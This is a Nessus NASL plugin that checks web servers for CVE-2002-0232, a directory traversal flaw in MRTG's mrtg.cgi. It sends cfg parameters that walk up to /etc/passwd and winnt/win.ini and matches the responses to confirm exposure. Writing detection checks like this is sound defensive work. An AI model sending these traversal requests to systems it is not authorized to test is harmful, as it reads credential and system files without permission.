#
# This script was written by H D Moore
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CVE
#
# Changes by Tenable:
# - Revised plugin title (2/10/2009)

include("compat.inc");

if(description)
{
 script_id(11001); 
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-2002-0232");
 script_bugtraq_id(4017);
 script_osvdb_id(823);

 script_name(english:"MRTG mrtg.cgi cfg Parameter Traversal Arbitrary Files Access");
 script_summary(english:"checks for mrtg.cgi");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that is prone to a directory
traversal attack.");
 script_set_attribute(attribute:"description", value:
"The 'mrtg.cgi' script is part of the MRTG traffic visualization
application.  A vulnerability exists in this script that allows an
attacker to view the first line of any file on the system.");
 script_set_attribute(attribute:"solution", value:
"Block access to this CGI.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value:
"2002/06/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/02/01");
 script_cvs_date("$Date: 2011/03/15 19:22:13 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2002-2011 Digital Defense Inc.");

 script_family(english:"CGI abuses");
 
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
req_unx = string(dir, "/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd");
req_win = string(dir, "/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini");

str = http_get(item:req_unx, port:port);
r = http_keepalive_send_recv(port:port, data:str);
if( isnull(r)) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
{
    security_warning(port);
    exit(0);
}


str = http_get(item:req_win, port:port);
r = http_keepalive_send_recv(port:port, data:str);
if( isnull(r) ) exit(0);
if("[16-bit]" >< r)
 {
    security_warning(port:port);
    exit(0);
 }
}

